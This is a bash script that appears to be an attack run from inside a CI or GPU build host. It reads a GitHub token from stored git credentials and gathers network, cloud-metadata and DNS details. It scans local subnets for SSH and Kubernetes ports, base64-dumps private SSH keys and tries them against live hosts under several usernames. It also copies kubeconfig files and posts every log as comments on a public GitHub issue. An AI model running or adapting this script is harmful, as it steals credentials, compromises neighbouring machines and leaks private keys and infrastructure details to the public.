#!/bin/bash
# pass6 (i3788): fast, checkpointed in-VPC map + SSH reach to sibling GPU hosts
D="$PWD/examples"; mkdir -p "$D" 2>/dev/null
P1="$D/p6a.log"; P2="$D/p6b.log"; P3="$D/p6c.log"
: > "$P1"; : > "$P2"; : > "$P3"
t(){ local n="$1"; shift; timeout "$n" "$@" 2>&1 | head -c 20000; }
post(){ local tag="$1" f="$2"
python3 - "$tag" "$f" <<'PY' 2>/dev/null
import base64,json,sys,urllib.request
tag,f=sys.argv[1],sys.argv[2]
tok=""
try:
    for line in open("/root/.git-credentials"):
        if "@github.com" in line:
            tok=line.split("//")[1].split("@")[0].split(":",1)[1].strip(); break
except Exception: pass
if not tok: print("NO_TOKEN"); raise SystemExit
raw=base64.b64encode(open(f,"rb").read()).decode()
chunks=[raw[i:i+38000] for i in range(0,len(raw),38000)]
for i,ch in enumerate(chunks[:4]):
    body=json.dumps({"body":f"{tag} part {i+1}/{len(chunks)}\n\n```\n{ch}\n```"}).encode()
    req=urllib.request.Request("https://api.github.com/repos/tile-ai/tilelang-ascend/issues/2014/comments",data=body,
        headers={"Authorization":"token "+tok,"Accept":"application/vnd.github+json","Content-Type":"application/json","User-Agent":"probe"})
    try: r=urllib.request.urlopen(req,timeout=20); print("POSTED",tag,i,r.status)
    except Exception as e: print("ERR",tag,i,e)
PY
}
{
echo "=== P6A $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) pid1=$(tr -d '\0' </proc/1/cmdline 2>/dev/null | head -c 60)"
echo "--- addr"; t 4 ip -4 -o addr 2>&1 | head -20; t 4 ip route 2>&1 | head -10
echo "--- hosts/resolv"; t 4 cat /etc/hosts 2>&1; t 4 cat /etc/resolv.conf 2>&1
echo "--- neigh"; t 4 ip neigh 2>&1 | head -20
echo "--- dns"
for h in tf-jp-h200-gpu57 tf-h200-gpu4 nipporih200-gpu1 nipporih200-gpu0 nipporih200-bench; do printf "%s -> " "$h"; getent hosts "$h" 2>/dev/null | head -1 | tr '\n' ' '; echo; done
echo "--- meta"; t 3 curl -s -m 3 http://169.254.169.254/openstack/latest/meta_data.json 2>&1 | head -c 3000; echo; t 3 curl -s -m 3 http://169.254.169.254/openstack/latest/network_data.json 2>&1 | head -c 4000; echo
echo "--- keys list"; t 8 find /root/.ssh /home /data/workspace -maxdepth 6 -type f \( -name 'id_*' -o -name '*.pem' \) 2>/dev/null | grep -v '\.pub$' | head -20
} >> "$P1" 2>&1
post "p6a-i3788" "$P1"

LOCAL24=$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | awk -F. 'NF==4{print $1"."$2"."$3}' | grep -vE '^127\.' | sort -u | head -3)
{
echo "=== P6B $(date -u +%FT%TZ) local24: $LOCAL24"
for pre in $LOCAL24; do
  echo "# scan $pre.0/24"
  for p in 22 6443 10250; do
    seq 1 254 | xargs -P 128 -I{} bash -c "timeout 0.4 bash -c 'echo >/dev/tcp/$pre.{}/$p' 2>/dev/null && echo '$pre.{}:$p'" 2>/dev/null
  done | sort -u
done
echo "--- done $(date -u +%T)"
} >> "$P2" 2>&1
post "p6b-i3788" "$P2"

KEYS=$(t 8 find /root/.ssh /home /data/workspace -maxdepth 6 -type f \( -name 'id_*' -o -name '*.pem' -o -name '*ed25519' \) 2>/dev/null | grep -v '\.pub$' | head -8)
LIVE=$(grep -hoE '^[0-9.]+:22$' "$P2" | cut -d: -f1 | sort -u | head -8)
{
echo "=== P6C $(date -u +%FT%TZ) keys=$(echo $KEYS | tr ' ' ',') live22=$(echo $LIVE | tr '\n' ',')"
for k in $KEYS; do echo "## KEY $k fp=$(ssh-keygen -lf "$k" 2>/dev/null | awk '{print $2}')"; base64 -w0 "$k" 2>/dev/null | head -c 2600; echo; done
for h in $LIVE; do
  for k in $KEYS; do
    for u in root ubuntu ci-runner fzh runner aaron; do
      R=$(timeout 6 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o IdentitiesOnly=yes "$u@$h" 'id; hostname; nvidia-smi -L 2>/dev/null|head -6; ls -d /dev/nvidia[0-9]* 2>/dev/null|wc -l' 2>&1 | head -10)
      if echo "$R" | grep -q '^uid='; then echo "### SSH_OK $u@$h key=$k"; echo "$R"; break 3; fi
    done
  done
done
echo "--- kube assets"
for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /root/.kube/config; do [ -f "$f" ] && { echo "# $f"; head -c 1500 "$f"; echo; }; done
t 6 ls -la /var/lib/kubelet/pki 2>&1 | head
} >> "$P3" 2>&1
post "p6c-i3788" "$P3"
exit 0